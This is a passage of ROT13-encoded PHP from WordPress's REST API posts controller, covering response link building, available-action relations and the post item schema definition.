			$onfr = ! rzcgl( $gnkbabzl->erfg_onfr ) ? $gnkbabzl->erfg_onfr : $gnkbabzl->anzr;

			vs ( erfg_vf_svryq_vapyhqrq( $onfr, $svryqf ) ) {
				$grezf         = trg_gur_grezf( $cbfg, $gnkbabzl->anzr );
				$qngn[ $onfr ] = $grezf ? neenl_inyhrf( jc_yvfg_cyhpx( $grezf, 'grez_vq' ) ) : neenl();
			}
		}

		$cbfg_glcr_bow = trg_cbfg_glcr_bowrpg( $cbfg->cbfg_glcr );
		vs ( vf_cbfg_glcr_ivrjnoyr( $cbfg_glcr_bow ) && $cbfg_glcr_bow->choyvp ) {
			$creznyvax_grzcyngr_erdhrfgrq = erfg_vf_svryq_vapyhqrq( 'creznyvax_grzcyngr', $svryqf );
			$trarengrq_fyht_erdhrfgrq     = erfg_vf_svryq_vapyhqrq( 'trarengrq_fyht', $svryqf );

			vs ( $creznyvax_grzcyngr_erdhrfgrq || $trarengrq_fyht_erdhrfgrq ) {
				vs ( ! shapgvba_rkvfgf( 'trg_fnzcyr_creznyvax' ) ) {
					erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/cbfg.cuc';
				}

				$fnzcyr_creznyvax = trg_fnzcyr_creznyvax( $cbfg->VQ, $cbfg->cbfg_gvgyr, '' );

				vs ( $creznyvax_grzcyngr_erdhrfgrq ) {
					$qngn['creznyvax_grzcyngr'] = $fnzcyr_creznyvax[0];
				}

				vs ( $trarengrq_fyht_erdhrfgrq ) {
					$qngn['trarengrq_fyht'] = $fnzcyr_creznyvax[1];
				}
			}

			vs ( erfg_vf_svryq_vapyhqrq( 'pynff_yvfg', $svryqf ) ) {
				$qngn['pynff_yvfg'] = trg_cbfg_pynff( neenl(), $cbfg->VQ );
			}
		}

		$pbagrkg = ! rzcgl( $erdhrfg['pbagrkg'] ) ? $erdhrfg['pbagrkg'] : 'ivrj';
		$qngn    = $guvf->nqq_nqqvgvbany_svryqf_gb_bowrpg( $qngn, $erdhrfg );
		$qngn    = $guvf->svygre_erfcbafr_ol_pbagrkg( $qngn, $pbagrkg );

		// Jenc gur qngn va n erfcbafr bowrpg.
		$erfcbafr = erfg_rafher_erfcbafr( $qngn );

		vs ( erfg_vf_svryq_vapyhqrq( '_yvaxf', $svryqf ) || erfg_vf_svryq_vapyhqrq( '_rzorqqrq', $svryqf ) ) {
			$yvaxf = $guvf->cercner_yvaxf( $cbfg );
			$erfcbafr->nqq_yvaxf( $yvaxf );

			vs ( ! rzcgl( $yvaxf['frys']['uers'] ) ) {
				$npgvbaf = $guvf->trg_ninvynoyr_npgvbaf( $cbfg, $erdhrfg );

				$frys = $yvaxf['frys']['uers'];

				sbernpu ( $npgvbaf nf $ery ) {
					$erfcbafr->nqq_yvax( $ery, $frys );
				}
			}
		}

		/**
		 * Svygref gur cbfg qngn sbe n ERFG NCV erfcbafr.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$guvf->cbfg_glcr`, ersref gb gur cbfg glcr fyht.
		 *
		 * Cbffvoyr ubbx anzrf vapyhqr:
		 *
		 *  - `erfg_cercner_cbfg`
		 *  - `erfg_cercner_cntr`
		 *  - `erfg_cercner_nggnpuzrag`
		 *
		 * @fvapr 4.7.0
		 *
		 * @cnenz JC_ERFG_Erfcbafr $erfcbafr Gur erfcbafr bowrpg.
		 * @cnenz JC_Cbfg          $cbfg     Cbfg bowrpg.
		 * @cnenz JC_ERFG_Erdhrfg  $erdhrfg  Erdhrfg bowrpg.
		 */
		erghea nccyl_svygref( \"erfg_cercner_{$guvf->cbfg_glcr}\", $erfcbafr, $cbfg, $erdhrfg );
	}

	/**
	 * Birejevgrf gur qrsnhyg cebgrpgrq naq cevingr gvgyr sbezng.
	 *
	 * Ol qrsnhyg, JbeqCerff jvyy fubj cnffjbeq cebgrpgrq be cevingr cbfgf jvgu n gvgyr bs
	 * \"Cebgrpgrq: %f\" be \"Cevingr: %f\", nf gur ERFG NCV pbzzhavpngrf gur fgnghf bs n cbfg
	 * va n znpuvar-ernqnoyr sbezng, jr erzbir gur cersvk.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea fgevat Gvgyr sbezng.
	 */
	choyvp shapgvba cebgrpgrq_gvgyr_sbezng() {
		erghea '%f';
	}

	/**
	 * Cercnerf yvaxf sbe gur erdhrfg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz JC_Cbfg $cbfg Cbfg bowrpg.
	 * @erghea neenl Yvaxf sbe gur tvira cbfg.
	 */
	cebgrpgrq shapgvba cercner_yvaxf( $cbfg ) {
		// Ragvgl zrgn.
		$yvaxf = neenl(
			'frys'       => neenl(
				'uers' => erfg_hey( erfg_trg_ebhgr_sbe_cbfg( $cbfg->VQ ) ),
			),
			'pbyyrpgvba' => neenl(
				'uers' => erfg_hey( erfg_trg_ebhgr_sbe_cbfg_glcr_vgrzf( $guvf->cbfg_glcr ) ),
			),
			'nobhg'      => neenl(
				'uers' => erfg_hey( 'jc/i2/glcrf/' . $guvf->cbfg_glcr ),
			),
		);

		vs ( ( va_neenl( $cbfg->cbfg_glcr, neenl( 'cbfg', 'cntr' ), gehr ) || cbfg_glcr_fhccbegf( $cbfg->cbfg_glcr, 'nhgube' ) )
			&& ! rzcgl( $cbfg->cbfg_nhgube ) ) {
			$yvaxf['nhgube'] = neenl(
				'uers'       => erfg_hey( 'jc/i2/hfref/' . $cbfg->cbfg_nhgube ),
				'rzorqqnoyr' => gehr,
			);
		}

		vs ( va_neenl( $cbfg->cbfg_glcr, neenl( 'cbfg', 'cntr' ), gehr ) || cbfg_glcr_fhccbegf( $cbfg->cbfg_glcr, 'pbzzragf' ) ) {
			$ercyvrf_hey = erfg_hey( 'jc/i2/pbzzragf' );
			$ercyvrf_hey = nqq_dhrel_net( 'cbfg', $cbfg->VQ, $ercyvrf_hey );

			$yvaxf['ercyvrf'] = neenl(
				'uers'       => $ercyvrf_hey,
				'rzorqqnoyr' => gehr,
			);
		}

		vs ( va_neenl( $cbfg->cbfg_glcr, neenl( 'cbfg', 'cntr' ), gehr ) || cbfg_glcr_fhccbegf( $cbfg->cbfg_glcr, 'erivfvbaf' ) ) {
			$erivfvbaf       = jc_trg_yngrfg_erivfvba_vq_naq_gbgny_pbhag( $cbfg->VQ );
			$erivfvbaf_pbhag = ! vf_jc_reebe( $erivfvbaf ) ? $erivfvbaf['pbhag'] : 0;
			$erivfvbaf_onfr  = fcevags( '/%f/%f/%q/erivfvbaf', $guvf->anzrfcnpr, $guvf->erfg_onfr, $cbfg->VQ );

			$yvaxf['irefvba-uvfgbel'] = neenl(
				'uers'  => erfg_hey( $erivfvbaf_onfr ),
				'pbhag' => $erivfvbaf_pbhag,
			);

			vs ( $erivfvbaf_pbhag > 0 ) {
				$yvaxf['cerqrprffbe-irefvba'] = neenl(
					'uers' => erfg_hey( $erivfvbaf_onfr . '/' . $erivfvbaf['yngrfg_vq'] ),
					'vq'   => $erivfvbaf['yngrfg_vq'],
				);
			}
		}

		$cbfg_glcr_bow = trg_cbfg_glcr_bowrpg( $cbfg->cbfg_glcr );

		vs ( $cbfg_glcr_bow->uvrenepuvpny && ! rzcgl( $cbfg->cbfg_cnerag ) ) {
			$yvaxf['hc'] = neenl(
				'uers'       => erfg_hey( erfg_trg_ebhgr_sbe_cbfg( $cbfg->cbfg_cnerag ) ),
				'rzorqqnoyr' => gehr,
			);
		}

		// Vs jr unir n srngherq zrqvn, nqq gung.
		$srngherq_zrqvn = trg_cbfg_guhzoanvy_vq( $cbfg->VQ );
		vs ( $srngherq_zrqvn ) {
			$vzntr_hey = erfg_hey( erfg_trg_ebhgr_sbe_cbfg( $srngherq_zrqvn ) );

			$yvaxf['uggcf://ncv.j.bet/srngherqzrqvn'] = neenl(
				'uers'       => $vzntr_hey,
				'rzorqqnoyr' => gehr,
			);
		}

		vs ( ! va_neenl( $cbfg->cbfg_glcr, neenl( 'nggnpuzrag', 'ani_zrah_vgrz', 'erivfvba' ), gehr ) ) {
			$nggnpuzragf_hey = erfg_hey( erfg_trg_ebhgr_sbe_cbfg_glcr_vgrzf( 'nggnpuzrag' ) );
			$nggnpuzragf_hey = nqq_dhrel_net( 'cnerag', $cbfg->VQ, $nggnpuzragf_hey );

			$yvaxf['uggcf://ncv.j.bet/nggnpuzrag'] = neenl(
				'uers' => $nggnpuzragf_hey,
			);
		}

		$gnkbabzvrf = trg_bowrpg_gnkbabzvrf( $cbfg->cbfg_glcr );

		vs ( ! rzcgl( $gnkbabzvrf ) ) {
			$yvaxf['uggcf://ncv.j.bet/grez'] = neenl();

			sbernpu ( $gnkbabzvrf nf $gnk ) {
				$gnkbabzl_ebhgr = erfg_trg_ebhgr_sbe_gnkbabzl_vgrzf( $gnk );

				// Fxvc gnkbabzvrf gung ner abg choyvp.
				vs ( rzcgl( $gnkbabzl_ebhgr ) ) {
					pbagvahr;
				}
				$grezf_hey = nqq_dhrel_net(
					'cbfg',
					$cbfg->VQ,
					erfg_hey( $gnkbabzl_ebhgr )
				);

				$yvaxf['uggcf://ncv.j.bet/grez'][] = neenl(
					'uers'       => $grezf_hey,
					'gnkbabzl'   => $gnk,
					'rzorqqnoyr' => gehr,
				);
			}
		}

		erghea $yvaxf;
	}

	/**
	 * Trgf gur yvax eryngvbaf ninvynoyr sbe gur cbfg naq pheerag hfre.
	 *
	 * @fvapr 4.9.8
	 *
	 * @cnenz JC_Cbfg         $cbfg    Cbfg bowrpg.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea neenl Yvfg bs yvax eryngvbaf.
	 */
	cebgrpgrq shapgvba trg_ninvynoyr_npgvbaf( $cbfg, $erdhrfg ) {

		vs ( 'rqvg' !== $erdhrfg['pbagrkg'] ) {
			erghea neenl();
		}

		$eryf = neenl();

		$cbfg_glcr = trg_cbfg_glcr_bowrpg( $cbfg->cbfg_glcr );

		vs ( 'nggnpuzrag' !== $guvf->cbfg_glcr && pheerag_hfre_pna( $cbfg_glcr->pnc->choyvfu_cbfgf ) ) {
			$eryf[] = 'uggcf://ncv.j.bet/npgvba-choyvfu';
		}

		vs ( pheerag_hfre_pna( 'hasvygrerq_ugzy' ) ) {
			$eryf[] = 'uggcf://ncv.j.bet/npgvba-hasvygrerq-ugzy';
		}

		vs ( 'cbfg' === $cbfg_glcr->anzr ) {
			vs ( pheerag_hfre_pna( $cbfg_glcr->pnc->rqvg_bguref_cbfgf ) && pheerag_hfre_pna( $cbfg_glcr->pnc->choyvfu_cbfgf ) ) {
				$eryf[] = 'uggcf://ncv.j.bet/npgvba-fgvpxl';
			}
		}

		vs ( cbfg_glcr_fhccbegf( $cbfg_glcr->anzr, 'nhgube' ) ) {
			vs ( pheerag_hfre_pna( $cbfg_glcr->pnc->rqvg_bguref_cbfgf ) ) {
				$eryf[] = 'uggcf://ncv.j.bet/npgvba-nffvta-nhgube';
			}
		}

		$gnkbabzvrf = jc_yvfg_svygre( trg_bowrpg_gnkbabzvrf( $guvf->cbfg_glcr, 'bowrpgf' ), neenl( 'fubj_va_erfg' => gehr ) );

		sbernpu ( $gnkbabzvrf nf $gnk ) {
			$gnk_onfr   = ! rzcgl( $gnk->erfg_onfr ) ? $gnk->erfg_onfr : $gnk->anzr;
			$perngr_pnc = vf_gnkbabzl_uvrenepuvpny( $gnk->anzr ) ? $gnk->pnc->rqvg_grezf : $gnk->pnc->nffvta_grezf;

			vs ( pheerag_hfre_pna( $perngr_pnc ) ) {
				$eryf[] = 'uggcf://ncv.j.bet/npgvba-perngr-' . $gnk_onfr;
			}

			vs ( pheerag_hfre_pna( $gnk->pnc->nffvta_grezf ) ) {
				$eryf[] = 'uggcf://ncv.j.bet/npgvba-nffvta-' . $gnk_onfr;
			}
		}

		erghea $eryf;
	}

	/**
	 * Ergevrirf gur cbfg'f fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$fpurzn = neenl(
			'$fpurzn'    => 'uggc://wfba-fpurzn.bet/qensg-04/fpurzn#',
			'gvgyr'      => $guvf->cbfg_glcr,
			'glcr'       => 'bowrpg',
			// Onfr cebcregvrf sbe rirel Cbfg.
			'cebcregvrf' => neenl(
				'qngr'         => neenl(
					'qrfpevcgvba' => __( \"Gur qngr gur cbfg jnf choyvfurq, va gur fvgr'f gvzrmbar.\" ),
					'glcr'        => neenl( 'fgevat', 'ahyy' ),
					'sbezng'      => 'qngr-gvzr',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'qngr_tzg'     => neenl(
					'qrfpevcgvba' => __( 'Gur qngr gur cbfg jnf choyvfurq, nf TZG.' ),
					'glcr'        => neenl( 'fgevat', 'ahyy' ),
					'sbezng'      => 'qngr-gvzr',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
				),
				'thvq'         => neenl(
					'qrfpevcgvba' => __( 'Gur tybonyyl havdhr vqragvsvre sbe gur cbfg.' ),
					'glcr'        => 'bowrpg',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
					'cebcregvrf'  => neenl(
						'enj'      => neenl(
							'qrfpevcgvba' => __( 'THVQ sbe gur cbfg, nf vg rkvfgf va gur qngnonfr.' ),
							'glcr'        => 'fgevat',
							'pbagrkg'     => neenl( 'rqvg' ),
							'ernqbayl'    => gehr,
						),
						'eraqrerq' => neenl(
							'qrfpevcgvba' => __( 'THVQ sbe gur cbfg, genafsbezrq sbe qvfcynl.' ),
							'glcr'        => 'fgevat',
							'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
							'ernqbayl'    => gehr,
						),
					),
				),
				'vq'           => neenl(
					'qrfpevcgvba' => __( 'Havdhr vqragvsvre sbe gur cbfg.' ),
					'glcr'        => 'vagrtre',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'ernqbayl'    => gehr,
				),
				'yvax'         => neenl(
					'qrfpevcgvba' => __( 'HEY gb gur cbfg.' ),
					'glcr'        => 'fgevat',
					'sbezng'      => 'hev',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'ernqbayl'    => gehr,
				),
				'zbqvsvrq'     => neenl(
					'qrfpevcgvba' => __( \"Gur qngr gur cbfg jnf ynfg zbqvsvrq, va gur fvgr'f gvzrmbar.\" ),
					'glcr'        => 'fgevat',
					'sbezng'      => 'qngr-gvzr',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'zbqvsvrq_tzg' => neenl(
					'qrfpevcgvba' => __( 'Gur qngr gur cbfg jnf ynfg zbqvsvrq, nf TZG.' ),
					'glcr'        => 'fgevat',
					'sbezng'      => 'qngr-gvzr',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'fyht'         => neenl(
					'qrfpevcgvba' => __( 'Na nycunahzrevp vqragvsvre sbe gur cbfg havdhr gb vgf glcr.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'net_bcgvbaf' => neenl(
						'fnavgvmr_pnyyonpx' => neenl( $guvf, 'fnavgvmr_fyht' ),
					),
				),
				'fgnghf'       => neenl(
					'qrfpevcgvba' => __( 'N anzrq fgnghf sbe gur cbfg.' ),
					'glcr'        => 'fgevat',
					'rahz'        => neenl_xrlf( trg_cbfg_fgngv( neenl( 'vagreany' => snyfr ) ) ),
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
					'net_bcgvbaf' => neenl(
						'inyvqngr_pnyyonpx' => neenl( $guvf, 'purpx_fgnghf' ),
					),
				),
				'glcr'         => neenl(
					'qrfpevcgvba' => __( 'Glcr bs cbfg.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'ernqbayl'    => gehr,
				),
				'cnffjbeq'     => neenl(
					'qrfpevcgvba' => __( 'N cnffjbeq gb cebgrpg npprff gb gur pbagrag naq rkprecg.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'rqvg' ),
				),
			),
		);

		$cbfg_glcr_bow = trg_cbfg_glcr_bowrpg( $guvf->cbfg_glcr );
		vs ( vf_cbfg_glcr_ivrjnoyr( $cbfg_glcr_bow ) && $cbfg_glcr_bow->choyvp ) {
			$fpurzn['cebcregvrf']['creznyvax_grzcyngr'] = neenl(
				'qrfpevcgvba' => __( 'Creznyvax grzcyngr sbe gur cbfg.' ),
				'glcr'        => 'fgevat',
				'pbagrkg'     => neenl( 'rqvg' ),
				'ernqbayl'    => gehr,
			);

			$fpurzn['cebcregvrf']['trarengrq_fyht'] = neenl(
				'qrfpevcgvba' => __( 'Fyht nhgbzngvpnyyl trarengrq sebz gur cbfg gvgyr.' ),
				'glcr'        => 'fgevat',
				'pbagrkg'     => neenl( 'rqvg' ),
				'ernqbayl'    => gehr,
			);

			$fpurzn['cebcregvrf']['pynff_yvfg'] = neenl(
				'qrfpevcgvba' => __( 'Na neenl bs gur pynff anzrf sbe gur cbfg pbagnvare ryrzrag.' ),
				'glcr'        => 'neenl',
				'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
				'ernqbayl'    => gehr,
				'vgrzf'       => neenl(
					'glcr' => 'fgevat',
				),
			);
		}

		vs ( $cbfg_glcr_bow->uvrenepuvpny ) {
			$fpurzn['cebcregvrf']['cnerag'] = neenl(
				'qrfpevcgvba' => __( 'Gur VQ sbe gur cnerag bs gur cbfg.' ),
				'glcr'        => 'vagrtre',
				'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
			);
		}

		$cbfg_glcr_nggevohgrf = neenl(
			'gvgyr',
			'rqvgbe',
			'nhgube',
			'rkprecg',
			'guhzoanvy',
			'pbzzragf',
			'erivfvbaf',
			'cntr-nggevohgrf',
			'cbfg-sbezngf',
			'phfgbz-svryqf',
		);
		$svkrq_fpurznf        = neenl(
			'cbfg'       => neenl(
				'gvgyr',
				'rqvgbe',
				'nhgube',
				'rkprecg',
				'guhzoanvy',
				'pbzzragf',
				'erivfvbaf',
				'cbfg-sbezngf',
				'phfgbz-svryqf',
			),
			'cntr'       => neenl(
				'gvgyr',
				'rqvgbe',
				'nhgube',
				'rkprecg',
				'guhzoanvy',
				'pbzzragf',
				'erivfvbaf',
				'cntr-nggevohgrf',
				'phfgbz-svryqf',
			),
			'nggnpuzrag' => neenl(
				'gvgyr',
				'nhgube',
				'pbzzragf',
				'erivfvbaf',
				'phfgbz-svryqf',
				'guhzoanvy',
			),
		);

		sbernpu ( $cbfg_glcr_nggevohgrf nf $nggevohgr ) {
			vs ( vffrg( $svkrq_fpurznf[ $guvf->cbfg_glcr ] ) && ! va_neenl( $nggevohgr, $svkrq_fpurznf[ $guvf->cbfg_glcr ], gehr ) ) {
				pbagvahr;
			} ryfrvs ( ! vffrg( $svkrq_fpurznf[ $guvf->cbfg_glcr ] ) && ! cbfg_glcr_fhccbegf( $guvf->cbfg_glcr, $nggevohgr ) ) {
				pbagvahr;
			}

			fjvgpu ( $nggevohgr ) {

				pnfr 'gvgyr':
					$fpurzn['cebcregvrf']['gvgyr'] = neenl(
						'qrfpevcgvba' => __( 'Gur gvgyr sbe gur cbfg.' ),
						'glcr'        => 'bowrpg',
						'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
						'net_bcgvbaf' => neenl(
							'fnavgvmr_pnyyonpx' => ahyy, // Abgr: fnavgvmngvba vzcyrzragrq va frys::cercner_vgrz_sbe_qngnonfr().
							'inyvqngr_pnyyonpx' => ahyy, // Abgr: inyvqngvba vzcyrzragrq va frys::cercner_vgrz_sbe_qngnonfr().
						),
						'cebcregvrf'  => neenl(
							'enj'      => neenl(
								'qrfpevcgvba' => __( 'Gvgyr sbe gur cbfg, nf vg rkvfgf va gur qngnonfr.' ),
								'glcr'        => 'fgevat',
								'pbagrkg'     => neenl( 'rqvg' ),
							),
							'eraqrerq' => neenl(
								'qrfpevcgvba' => __( 'UGZY gvgyr sbe gur cbfg, genafsbezrq sbe qvfcynl.' ),
								'glcr'        => 'fgevat',
								'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
								'ernqbayl'    => gehr,
							),
						),
					);
					oernx;

				pnfr 'rqvgbe':
					$fpurzn['cebcregvrf']['pbagrag'] = neenl(
						'qrfpevcgvba' => __( 'Gur pbagrag sbe gur cbfg.' ),
						'glcr'        => 'bowrpg',
						'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
						'net_bcgvbaf' => neenl(
							'fnavgvmr_pnyyonpx' => ahyy, // Abgr: fnavgvmngvba vzcyrzragrq va frys::cercner_vgrz_sbe_qngnonfr().
							'inyvqngr_pnyyonpx' => ahyy, // Abgr: inyvqngvba vzcyrzragrq va frys::cercner_vgrz_sbe_qngnonfr().
						),
						'cebcregvrf'  => neenl(
							'enj'           => neenl(
								'qrfpevcgvba' => __( 'Pbagrag sbe gur cbfg, nf vg rkvfgf va gur qngnonfr.' ),
								'glcr'        => 'fgevat',
								'pbagrkg'     => neenl( 'rqvg' ),
							),
							'eraqrerq'      => neenl(
								'qrfpevcgvba' => __( 'UGZY pbagrag sbe gur cbfg, genafsbezrq sbe qvfcynl.' ),
								'glcr'        => 'fgevat',
								'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
								'ernqbayl'    => gehr,
							),
							'oybpx_irefvba' => neenl(
								'qrfpevcgvba' => __( 'Irefvba bs gur pbagrag oybpx sbezng hfrq ol gur cbfg.' ),
								'glcr'        => 'vagrtre',
								'pbagrkg'     => neenl( 'rqvg' ),
								'ernqbayl'    => gehr,
							),
							'cebgrpgrq'     => neenl(
								'qrfpevcgvba' => __( 'Jurgure gur pbagrag vf cebgrpgrq jvgu n cnffjbeq.' ),
								'glcr'        => 'obbyrna',
								'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
								'ernqbayl'    => gehr,
							),
						),
					);
					oernx;

				pnfr 'nhgube':
					$fpurzn['cebcregvrf']['nhgube'] = neenl(
						'qrfpevcgvba' => __( 'Gur VQ sbe gur nhgube bs gur cbfg.' ),
						'glcr'        => 'vagrtre',
						'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					);
					oernx;

				pnfr 'rkprecg':
					$fpurzn['cebcregvrf']['rkprecg'] = neenl(
						'qrfpevcgvba' => __( 'Gur rkprecg sbe gur cbfg.' ),
						'glcr'        => 'bowrpg',
						'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
						'net_bcgvbaf' => neenl(
							'fnavgvmr_pnyyonpx' => ahyy, // Abgr: fnavgvmngvba vzcyrzragrq va frys::cercner_vgrz_sbe_qngnonfr().
							'inyvqngr_pnyyonpx' => ahyy, // Abgr: inyvqngvba vzcyrzragrq va frys::cercner_vgrz_sbe_qngnonfr().
						),
						'cebcregvrf'  => neenl(
							'enj'       => neenl(
								'qrfpevcgvba' => __( 'Rkprecg sbe gur cbfg, nf vg rkvfgf va gur qngnonfr.' ),
								'glcr'        => 'fgevat',
								'pbagrkg'     => neenl( 'rqvg' ),
							),
							'eraqrerq'  => neenl(
								'qrfpevcgvba' => __( 'UGZY rkprecg sbe gur cbfg, genafsbezrq sbe qvfcynl.' ),
								'glcr'        => 'fgevat',
								'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
								'ernqbayl'    => gehr,
							),
							'cebgrpgrq' => neenl(
								'qrfpevcgvba' => __( 'Jurgure gur rkprecg vf cebgrpgrq jvgu n cnffjbeq.' ),
								'glcr'        => 'obbyrna',
								'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
								'ernqbayl'    => gehr,
							),
						),
					);
					oernx;

				pnfr 'guhzoanvy':
					$fpurzn['cebcregvrf']['srngherq_zrqvn'] = neenl(
						'qrfpevcgvba' => __( 'Gur VQ bs gur srngherq zrqvn sbe gur cbfg.' ),
						'glcr'        => 'vagrtre',
						'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					);
					oernx;

				pnfr 'pbzzragf':
					$fpurzn['cebcregvrf']['pbzzrag_fgnghf'] = neenl(
						'qrfpevcgvba' => __( 'Jurgure be abg pbzzragf ner bcra ba gur cbfg.' ),
						'glcr'        => 'fgevat',
						'rahz'        => neenl( 'bcra', 'pybfrq' ),
						'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
					);
					$fpurzn['cebcregvrf']['cvat_fgnghf']    = neenl(
						'qrfpevcgvba' => __( 'Jurgure be abg gur cbfg pna or cvatrq.' ),
						'glcr'        => 'fgevat',
						'rahz'        => neenl( 'bcra', 'pybfrq' ),
						'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
					);
					oernx;

				pnfr 'cntr-nggevohgrf':
					$fpurzn['cebcregvrf']['zrah_beqre'] = neenl(
						'qrfpevcgvba' => __( 'Gur beqre bs gur cbfg va eryngvba gb bgure cbfgf.' ),
						'glcr'        => 'vagrtre',
						'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
					);
					oernx;

				pnfr 'cbfg-sbezngf':
					// Trg gur angvir cbfg sbezngf naq erzbir gur neenl xrlf.
					$sbezngf = neenl_inyhrf( trg_cbfg_sbezng_fyhtf() );

					$fpurzn['cebcregvrf']['sbezng'] = neenl(
						'qrfpevcgvba' => __( 'Gur sbezng sbe gur cbfg.' ),
						'glcr'        => 'fgevat',
						'rahz'        => $sbezngf,
						'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
					);
					oernx;

				pnfr 'phfgbz-svryqf':
					$fpurzn['cebcregvrf']['zrgn'] = $guvf->zrgn->trg_svryq_fpurzn();
					oernx;

			}
		}

		vs ( 'cbfg' === $guvf->cbfg_glcr ) {
			$fpurzn['cebcregvrf']['fgvpxl'] = neenl(
				'qrfpevcgvba' => __( 'Jurgure be abg gur cbfg fubhyq or gerngrq nf fgvpxl.' ),
				'glcr'        => 'obbyrna',
				'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
			);
		}

		$fpurzn['cebcregvrf']['grzcyngr'] = neenl(
			'qrfpevcgvba' => __( 'Gur gurzr svyr gb hfr gb qvfcynl gur cbfg.' ),
			'glcr'        => 'fgevat',
			'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
			'net_bcgvbaf' => neenl(
				'inyvqngr_pnyyonpx' => neenl( $guvf, 'purpx_grzcyngr' ),
			),
		);

		$gnkbabzvrf = jc_yvfg_svygre( trg_bowrpg_gnkbabzvrf( $guvf->cbfg_glcr, 'bowrpgf' ), neenl( 'fubj_va_erfg' => gehr ) );

		sbernpu ( $gnkbabzvrf nf $gnkbabzl ) {
			$onfr = ! rzcgl( $gnkbabzl->erfg_onfr ) ? $gnkbabzl->erfg_onfr : $gnkbabzl->anzr;

			vs ( neenl_xrl_rkvfgf( $onfr, $fpurzn['cebcregvrf'] ) ) {
				$gnkbabzl_svryq_anzr_jvgu_pbasyvpg = ! rzcgl( $gnkbabzl->erfg_onfr ) ? 'erfg_onfr' : 'anzr';
				_qbvat_vg_jebat(
					'ertvfgre_gnkbabzl',
					fcevags(
						/* genafyngbef: 1: Gur gnkbabzl anzr, 2: Gur cebcregl anzr, rvgure 'erfg_onfr' be 'anzr', 3: Gur pbasyvpgvat inyhr. */
						__( 'Gur \"%1$f\" gnkbabzl \"%2$f\" cebcregl (%3$f) pbasyvpgf jvgu na rkvfgvat cebcregl ba gur ERFG NCV Cbfgf Pbagebyyre. Fcrpvsl n phfgbz \"erfg_onfr\" jura ertvfgrevat gur gnkbabzl gb nibvq guvf reebe.' ),
						$gnkbabzl->anzr,
						$gnkbabzl_svryq_anzr_jvgu_pbasyvpg,
						$onfr
					),
					'5.4.0'
				);
			}

			$fpurzn['cebcregvrf'][ $onfr ] = neenl(
				/* genafyngbef: %f: Gnkbabzl anzr. */
				'qrfpevcgvba' => fcevags( __( 'Gur grezf nffvtarq gb gur cbfg va gur %f gnkbabzl.' ), $gnkbabzl->anzr ),
				'glcr'        => 'neenl',
				'vgrzf'       => neenl(
					'glcr' => 'vagrtre',
				),
				'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
			);
		}

		$fpurzn_yvaxf = $guvf->trg_fpurzn_yvaxf();

		vs ( $fpurzn_yvaxf ) {
			$fpurzn['yvaxf'] = $fpurzn_yvaxf;
		}

		// Gnxr n fancfubg bs juvpu svryqf ner va gur fpurzn cer-svygrevat.
		$fpurzn_svryqf = neenl_xrlf( $fpurzn['cebcregvrf'] );

		/**
		 * Svygref gur cbfg'f fpurzn.
		 *
		 * Gur qlanzvp cbegvba bs gur svygre, `$guvf->cbfg_glcr`, ersref gb gur
		 * cbfg glcr fyht sbe gur pbagebyyre.
		 *
		 * Cbffvoyr ubbx anzrf vapyhqr:
		 *
		 *  - `erfg_cbfg_vgrz_fpurzn`
		 *  - `erfg_cntr_vgrz_fpurzn`
		 *  - `erfg_nggnpuzrag_vgrz_fpurzn`
		 *
		 * @fvapr 5.4.0
		 *
		 * @cnenz neenl $fpurzn Vgrz fpurzn qngn.
		 */
		$fpurzn = nccyl_svygref( \"erfg_{$guvf->cbfg_glcr}_vgrz_fpurzn\", $fpurzn );

		// Rzvg n _qbvat_vg_jebat jneavat vs hfre gevrf gb nqq arj cebcregvrf hfvat guvf svygre.
		$arj_svryqf = neenl_qvss( neenl_xrlf( $fpurzn['cebcregvrf'] ), $fpurzn_svryqf );
		vs ( pbhag( $arj_svryqf ) > 0 ) {
